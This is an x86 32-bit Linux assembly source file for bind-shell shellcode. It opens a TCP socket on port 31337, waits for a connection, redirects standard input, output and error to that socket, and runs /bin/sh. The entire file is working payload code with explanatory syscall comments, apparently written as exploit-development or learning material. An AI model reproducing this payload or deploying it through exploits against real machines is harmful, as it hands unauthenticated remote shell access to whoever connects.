; Port binding shellcode - Vikrant Navalgund
; Targets 32-bit OS
; [ socket --> bind --> listen --> accept --> dup2 --> execve("/bin/sh", ..) ]

BITS 32
section .text
global _start

%define PORT_BIND 31337
%define SYS_SOCKETCALL 0x66
%define SYS_DUP2 0x3f
%define SYS_EXECVE 0xb

_start:
	; socket(int domain, int type, int protcol);
	;       (AF_INET = 2, SOCK_STREAM = 1, protocol = 0)
	push BYTE SYS_SOCKETCALL   ; socketcall() syscall number 
	pop eax
	cdq
	xor ebx, ebx
	inc ebx
	push edx
	push BYTE 0x1
	push BYTE 0x2
	mov ecx, esp
	int 0x80         ; eax should hold the socket fd
	mov esi, eax     ; save the socketfd for subsequent calls

	; bind(int socketfd, const struct sockaddr *addr, socklen_t addrlen);
	inc ebx
    mov WORD ax, PORT_BIND
	xchg ah, al
	push edx
	push ax 
	push WORD bx
	mov ecx, esp
	push BYTE SYS_SOCKETCALL
	pop eax
	push BYTE 0x10
	push ecx
	push esi
	mov ecx, esp
	int 0x80
	
	; listen(int sockfd, int backlog);
	mov BYTE al, SYS_SOCKETCALL
	inc ebx
	inc ebx
	push ebx
	push esi
	mov ecx, esp
	int 0x80
	
	; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	mov BYTE al, SYS_SOCKETCALL
	inc ebx
	push edx
	push edx
	push esi
	mov ecx, esp
	int 0x80

	; dup2(int sockfd, int newfd);
	mov ebx, eax
	xor ecx, ecx
	xor eax, eax
	_dupfds:
		mov BYTE al, SYS_DUP2
		int 0x80
		inc ecx
		cmp cl, 0x2
		jle _dupfds
			
	; execve(cont char* filename, char const* argv[], chat const* argp[]);
    mov BYTE al, SYS_EXECVE
    push edx
	push DWORD 0x68732f2f  ; //sh			
    push DWORD 0x6e69622f  ; /bin
	mov ebx, esp
	xor ecx, ecx
	push ecx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80
